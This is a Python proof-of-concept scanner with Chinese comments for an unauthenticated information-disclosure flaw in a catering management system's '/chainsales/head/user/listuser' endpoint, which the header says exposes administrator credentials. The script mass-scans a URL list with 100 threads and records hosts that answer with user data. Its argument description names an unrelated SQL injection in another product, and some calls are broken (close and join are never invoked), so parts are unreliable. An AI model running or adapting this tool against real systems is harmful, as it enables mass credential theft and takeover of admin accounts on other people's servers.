#喰星云·数字化餐饮服务系统 listuser 接口处存在信息泄露漏洞，未经身份验证的远程攻击者可利用此漏洞读取后台管理员账号密码登录凭证信息，
#导致后台权限被控，造成信息泄露，使系统处于极不安全的状态。
import requests,sys,argparse,urllib3
from multiprocessing.dummy import Pool

urllib3.disable_warnings()

def main():
    parse = argparse.ArgumentParser(description="用友时空KSOA /servlet/imagefield接口中sKeyvalue参数存在sql注入")

    parse.add_argument('-u','-url',dest='url',type=str,help="Please input -h")
    parse.add_argument('-f','-file',dest='file',type=str,help="Please input -h")

    args = parse.parse_args()

    if args.url and not args.file:
        poc(args.url.strip())
    elif args.file and not args.url:
        lis = []
        with open('url.txt','r',encoding='utf-8')as fp:
            for url in fp.readlines():
                lis.append(url.strip())
            mp = Pool(100)
            mp.map(poc,lis)
            mp.close
            mp.join

    # print("Usage：python "+sys.argv[0]+' -h')



def poc(target):
    
    payload = '/chainsales/head/user/listuser'
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36',
        'Accept-Encoding': 'gzip, deflate',
        'Accept': '*/*',
        'Connection': 'keep-alive'
    }
    proxy = {
        'http':'http://127.0.0.1:8080',
        'https':'https://127.0.0.1:8080'
    }
    try:
        res1 = requests.get(url = target+payload,headers=headers,proxies=proxy,timeout=5,verify=False)
        if 'username' in res1.text:
            print(target)
            with open('result.txt','a',encoding='utf-8')as f:
                f.write(target+'\n')
    except Exception as e:
        pass

if __name__ == '__main__':
    main()